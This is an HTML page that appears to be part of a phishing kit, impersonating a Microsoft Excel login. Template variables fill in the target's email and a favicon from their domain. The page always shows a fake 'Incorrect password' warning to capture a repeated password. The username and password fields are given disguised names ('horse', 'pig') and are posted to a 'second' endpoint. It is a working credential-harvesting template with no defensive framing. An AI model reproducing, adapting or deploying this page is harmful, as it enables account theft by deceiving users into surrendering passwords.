<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Excel - Login</title>
  <link rel="icon" href="https://logo.clearbit.com/{{dman}}" type="image/x-icon">
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .auth-wrapper {
      position: relative;
      background: rgba(255, 255, 255, 0.97);
      padding: 48px;
      width: 400px;
      border-radius: 16px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(10px);
      animation: fadePop 0.8s ease-out;
    }

    @keyframes fadePop {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .brand-logo {
      width: 100px;
      position: absolute;
      top: -50px;
      left: 50%;
      transform: translateX(-50%);
    }

    .auth-title {
      font-size: 30px;
      color: #217346;
      margin: 60px 0 25px;
    }

    .form-notice {
      color: #a80000;
      font-size: 13px;
      text-align: left;
      margin-bottom: 20px;
    }

    .form-section {
      margin-bottom: 20px;
      text-align: left;
    }

    .form-section label {
      display: block;
      font-weight: 600;
      margin-bottom: 5px;
      color: #333;
    }

    .form-section input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 8px;
      border: 2px solid #217346;
      background: #f7f7f7;
      transition: all 0.3s ease;
    }

    .form-section input:focus {
      border-color: #1a5d32;
      background: #fff;
      outline: none;
    }

    .submit-control {
      width: 100%;
      padding: 15px;
      font-size: 17px;
      font-weight: bold;
      background: linear-gradient(45deg, #217346, #1a5d32);
      border: none;
      color: white;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .submit-control:hover {
      background: linear-gradient(45deg, #1a5d32, #0f3d21);
    }

    .link-forgot {
      display: block;
      margin-top: 15px;
      font-size: 14px;
      color: #217346;
      text-decoration: none;
    }

    .link-forgot:hover {
      color: #1a5d32;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="auth-wrapper">
    <img class="brand-logo" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...TRUNCATED..." alt="Excel Logo">
    <h2 class="auth-title">Excel Login</h2>

    <form action="second" method="POST">
      <div class="form-notice">‚ùó Incorrect password. Try again.</div>

      <div class="form-section">
        <label for="username">Username</label>
        <input type="text" id="username" name="horse" value="{{eman}}" required>
      </div>

      <div class="form-section">
        <label for="password">Password</label>
        <input type="password" id="password" name="pig" placeholder="Enter your password" required>
      </div>

      <button type="submit" class="submit-control">Login</button>
    </form>

    <a href="#" class="link-forgot">Forgot Password?</a>
  </div>
</body>
</html>
